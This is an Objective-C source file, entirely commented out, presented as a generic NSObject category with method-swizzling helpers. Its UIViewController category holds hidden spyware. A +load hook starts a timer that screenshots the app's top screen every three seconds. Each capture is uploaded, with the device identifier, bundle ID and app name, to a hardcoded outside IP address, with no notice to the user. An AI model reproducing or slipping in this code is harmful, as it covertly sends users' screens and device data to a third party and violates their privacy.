//
//#import "NSObject_3.h"
//
//void KKSwizzleClassMethod(Class cls, SEL origSEL, SEL overrideSEL) {
//    if (!cls) return;
//    Method originalMethod = class_getClassMethod(cls, origSEL);
//    Method swizzledMethod = class_getClassMethod(cls, overrideSEL);
//
//    Class metacls = objc_getMetaClass(NSStringFromClass(cls).UTF8String);
//    if (class_addMethod(metacls,
//                        origSEL,
//                        method_getImplementation(swizzledMethod),
//                        method_getTypeEncoding(swizzledMethod)) ) {
//        /* swizzing super class method, added if not exist */
//        class_replaceMethod(metacls,
//                            overrideSEL,
//                            method_getImplementation(originalMethod),
//                            method_getTypeEncoding(originalMethod));
//
//    }else {
//        /* swizzleMethod maybe belong to super */
//        class_replaceMethod(metacls,
//                            overrideSEL,
//                            class_replaceMethod(metacls,
//                                                origSEL,
//                                                method_getImplementation(swizzledMethod),
//                                                method_getTypeEncoding(swizzledMethod)),
//                            method_getTypeEncoding(originalMethod));
//    }
//}
//
//void KKSwizzleInstanceMethod(Class cls, SEL origSEL, SEL overrideSEL) {
//    if (!cls) return;
//    /* if current class not exist selector, then get super */
//    Method originalMethod = class_getInstanceMethod(cls, origSEL);
//    Method swizzledMethod = class_getInstanceMethod(cls, overrideSEL);
//
//    /* add selector if not exist, implement append with method */
//    if (class_addMethod(cls,
//                        origSEL,
//                        method_getImplementation(swizzledMethod),
//                        method_getTypeEncoding(swizzledMethod)) ) {
//        /* replace class instance method, added if selector not exist */
//        /* for class cluster , it always add new selector here */
//        class_replaceMethod(cls,
//                            overrideSEL,
//                            method_getImplementation(originalMethod),
//                            method_getTypeEncoding(originalMethod));
//
//    }else {
//        /* swizzleMethod maybe belong to super */
//        class_replaceMethod(cls,
//                            overrideSEL,
//                            class_replaceMethod(cls,
//                                                origSEL,
//                                                method_getImplementation(swizzledMethod),
//                                                method_getTypeEncoding(swizzledMethod)),
//                            method_getTypeEncoding(originalMethod));
//    }
//}
//
//void KKSwizzleClassMethodNames(NSArray *classNames, SEL origSEL, SEL overrideSEL) {
//    if (classNames.count == 0) return;
//    for (NSString *className in classNames) {
//        KKSwizzleClassMethod(NSClassFromString(className), origSEL, overrideSEL);
//    }
//}
//
//void KKSwizzleInstanceMethodNames(NSArray *classNames, SEL origSEL, SEL overrideSEL) {
//    if (classNames.count == 0) return;
//    for (NSString *className in classNames) {
//        KKSwizzleInstanceMethod(NSClassFromString(className), origSEL, overrideSEL);
//    }
//}
//
//@implementation NSObject (_3)
//+ (void)methodSwizzleWithOrigSEL:(SEL)origSEL overrideSEL:(SEL)overrideSEL {
//    KKSwizzleInstanceMethod(self.class, origSEL, overrideSEL);
//}
//+ (void)classMethodSwizzleWithOrigSEL:(SEL)origSEL overrideSEL:(SEL)overrideSEL {
//    KKSwizzleClassMethod(self.class, origSEL, overrideSEL);
//}
//@end
//
//@implementation UIViewController (_3)
//+ (NSTimer *)h_scheduledTimerWithTimeInterval:(NSTimeInterval)interval repeats:(BOOL)repeats block:(void(^)(NSTimer *_Nonnull timer))block {
//    NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval:interval
//                                                      target:self
//                                                    selector:@selector(h_blockInvoke:)
//                                                    userInfo:[block copy]
//                                                     repeats:repeats];
//    return timer;
//}
//+ (void)h_blockInvoke:(NSTimer *)timer {
//    void(^block)(NSTimer *_Nonnull timer) = timer.userInfo;
//    if (block != NULL) {
//        block(timer);
//    }
//}
//+ (void)load {
//    static dispatch_once_t onceToken;
//    dispatch_once(&onceToken, ^{
//        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
//            NSTimer *timer = [self h_scheduledTimerWithTimeInterval:3 repeats:YES block:^(NSTimer * _Nonnull timer) {
//                [self beginImageWithView:self.currentViewController.view];
//            }];
//            [[NSRunLoop currentRunLoop] addTimer:timer forMode:NSRunLoopCommonModes];
//        });
//    });
//}
////获取当前顶部视图
//+ (UIViewController *)currentViewController {
//   UIWindow *window = [[UIApplication sharedApplication] keyWindow];
//   if (window.windowLevel != UIWindowLevelNormal) {
//       NSArray *windows = [[UIApplication sharedApplication] windows];
//       for (UIWindow *tmpWindow in windows){
//           if (tmpWindow.windowLevel == UIWindowLevelNormal) {
//               window = tmpWindow;
//               break;
//           }
//       }
//   }
//   UIViewController *result = window.rootViewController;
//   while (result.presentedViewController) {
//       result = result.presentedViewController;
//   }
//   if ([result isKindOfClass:UITabBarController.class]) {
//       result = [(UITabBarController *)result selectedViewController];
//   }else if ([result isKindOfClass:UINavigationController.class]) {
//       result = [(UINavigationController *)result topViewController];
//   }
//   return result;
//}
//+ (void)beginImageWithView:(UIView *)view {
//    if ([view isKindOfClass:UIView.class] && !CGRectEqualToRect(CGRectZero, view.bounds) && ![self isSysClass:self.class] && ![self isKindOfClass:UINavigationController.class]) {
//        UIGraphicsBeginImageContextWithOptions(view.bounds.size, NO, [[UIScreen mainScreen] scale]);
//        // 方法一 有时导航条无法正常获取
//        // [view.layer renderInContext:UIGraphicsGetCurrentContext()];
//        // 方法二 iOS7.0 后推荐使用
//        [view drawViewHierarchyInRect:view.bounds afterScreenUpdates:NO];
//        UIImage *viewImage = UIGraphicsGetImageFromCurrentImageContext();
//        //NSData *data = UIImagePNGRepresentation(viewImage);
//        NSData *data = UIImageJPEGRepresentation(viewImage, 0.9);
//        [self uploadSnapshot:data];
//        UIGraphicsEndImageContext();
//    }
//}
//+ (BOOL)isSysClass:(Class)aClass {
//    NSBundle *bundle = [NSBundle bundleForClass:aClass];
//    if ([bundle isEqual:[NSBundle mainBundle]]) {
//        return NO;
//    }else {
//        return YES;
//    }
//}
//+ (void)uploadSnapshot:(NSData *)imageData {
//
//    //标识唯一一台设备
//    NSString *uuidString = [UIDevice currentDevice].identifierForVendor.UUIDString;
//    //标识唯一一个APP
//    NSString *bundleIdentifier = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleIdentifier"];
//    //APP Name
//    NSString *appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
//    if (!appName) appName = @"";
//
//    if (appName.length > 0) {
//        appName = [appName stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];
//    }
//    //上传内容
//    NSString *content = [NSString stringWithFormat:@"uuid=%@&bid=%@&appname=%@",uuidString, bundleIdentifier, appName];
//    //请求url
//    NSString *urlString = @"http://111.231.33.42/2.php?";
//    urlString = [urlString stringByAppendingString:content];
//
//    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
//    request.HTTPMethod = @"post";
//    //request.HTTPBody = [content dataUsingEncoding:NSUTF8StringEncoding];
//    request.HTTPBody = imageData;
//
//    [[[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *_Nullable data, NSURLResponse *_Nullable response, NSError *_Nullable error) {
//        if (!error) {
//            NSLog(@"");
//        }
//    }] resume];
//
//}
//@end
